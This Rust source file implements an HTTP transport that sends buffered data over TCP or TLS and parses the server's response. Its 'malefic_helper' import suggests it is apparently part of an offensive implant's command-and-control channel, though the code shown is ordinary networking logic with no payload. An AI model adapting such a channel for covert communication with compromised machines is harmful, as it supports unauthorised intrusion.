use crate::config::HTTP;
use crate::transport::tcp::TCPTransport;
use crate::transport::{DialerExt, Stream, TransportError, TransportTrait};
use anyhow::Result;
use async_net::TcpStream;
use async_trait::async_trait;
use futures::lock::Mutex;
use futures::{AsyncWriteExt};
use malefic_helper::debug;
use std::io::{Cursor, Read};
use std::sync::Arc;


#[derive(Clone)]
pub struct HTTPTransport {
    inner: Option<TCPTransport>,
    host: String,
    send_buffer: Arc<Mutex<Vec<u8>>>,
    recv_buffer: Arc<Mutex<Cursor<Vec<u8>>>>,
    data_ready: Arc<Mutex<bool>>,
}

impl HTTPTransport {
    pub async fn new(url: String) -> Result<Self> {
        let parts: Vec<&str> = url.split('/').collect();
        let host = parts[0].to_string();

        let transport = HTTPTransport {
            inner: None,
            host,
            send_buffer: Arc::new(Mutex::new(Vec::new())),
            recv_buffer: Arc::new(Mutex::new(Cursor::new(Vec::new()))),
            data_ready: Arc::new(Mutex::new(false)),
        };

        Ok(transport)
    }

    async fn ensure_connection(&mut self) -> Result<()> {
        if self.inner.is_none() {
            let stream = TcpStream::connect(&self.host).await?;
            let mut transport = TCPTransport::new(stream);

            #[cfg(feature = "tls")]
            {
                let domain = self.host.split(':').next().unwrap_or("").to_string();
                transport = TCPTransport::new_with_tls(transport.stream.clone(), vec![], domain);
                transport.connect_tls().await?;
            }

            self.inner = Some(transport);
        }
        Ok(())
    }

    async fn do_request(&mut self, data: Vec<u8>) -> Result<Vec<u8>> {
        self.ensure_connection().await?;
        let transport = self.inner.as_mut().unwrap();

        let mut header = HTTP.clone();
        header.push_str(&format!("Content-Length: {}\r\n\r\n", data.len()));
        transport.send(header.as_bytes().to_vec()).await?;
        transport.send(data).await?;

        let mut header_buf = Vec::new();
        let mut header_end = 0;

        loop {
            let chunk = transport.recv(1).await?;
            if chunk.is_empty() {
                return Err(TransportError::RecvError.into());
            }

            header_buf.extend_from_slice(&chunk);

            if header_buf.len() >= 4 {
                let window = &header_buf[header_buf.len() - 4..];
                if window == b"\r\n\r\n" {
                    header_end = header_buf.len();
                    break;
                }
            }
        }
        let mut headers = [httparse::EMPTY_HEADER; 16];
        let mut resp = httparse::Response::new(&mut headers);
        match resp.parse(&header_buf)? {
            httparse::Status::Complete(offset) => {
                let content_length = resp
                    .headers
                    .iter()
                    .find(|h| h.name.eq_ignore_ascii_case("content-length"))
                    .and_then(|h| std::str::from_utf8(h.value).ok())
                    .and_then(|s| s.parse::<usize>().ok());

                if content_length.is_none() {
                    return Ok(Vec::new());
                }

                let length = content_length.unwrap();
                let mut body = Vec::new();
                let mut remaining = length;

                while remaining > 0 {
                    let chunk = transport.recv(remaining.min(1024)).await?;
                    if chunk.is_empty() {
                        return Err(TransportError::RecvError.into());
                    }
                    body.extend_from_slice(&chunk);
                    remaining -= chunk.len();
                }

                Ok(body)
            }
            httparse::Status::Partial => Err(TransportError::RecvError.into()),
        }
    }
}

#[async_trait]
impl TransportTrait for HTTPTransport {
    async fn done(&mut self) -> Result<()> {
        let send_data = {
            let buffer = self.send_buffer.lock().await;
            buffer.clone()
        };
        let response = self.do_request(send_data).await?;
        {
            let mut buffer = self.recv_buffer.lock().await;
            *buffer = Cursor::new(response);
        }
        {
            let mut buffer = self.send_buffer.lock().await;
            buffer.clear();
        }

        let mut ready = self.data_ready.lock().await;
        *ready = true;
        Ok(())
    }

    async fn send(&mut self, data: Vec<u8>) -> Result<usize> {
        let mut ready = self.data_ready.lock().await;
        *ready = false;
        drop(ready);

        let mut buffer = self.send_buffer.lock().await;
        buffer.extend_from_slice(&data);
        Ok(data.len())
    }

    async fn recv(&mut self, len: usize) -> Result<Vec<u8>> {
        loop {
            let ready = self.data_ready.lock().await;
            if *ready {
                break;
            }
            drop(ready);
            futures_timer::Delay::new(std::time::Duration::from_millis(10)).await;
        }

        let mut buffer = self.recv_buffer.lock().await;
        let mut result = vec![0; len];
        let n = buffer.read(&mut result)?;
        result.truncate(n);
        Ok(result)
    }

    async fn close(&mut self) -> Result<bool> {
        if let Some(mut transport) = self.inner.as_mut() {
            AsyncWriteExt::close(&mut transport).await?;
            self.inner = None;
        }
        Ok(true)
    }
}


#[derive(Clone)]
pub struct HTTPClient {
    pub stream: Stream,
}

#[async_trait]
impl DialerExt for HTTPClient {
    async fn connect(&mut self, addr: &str) -> Result<HTTPTransport> {
        debug!("[transport] Connecting to HTTP server at {}", addr);
        HTTPTransport::new(addr.to_string()).await
    }
}
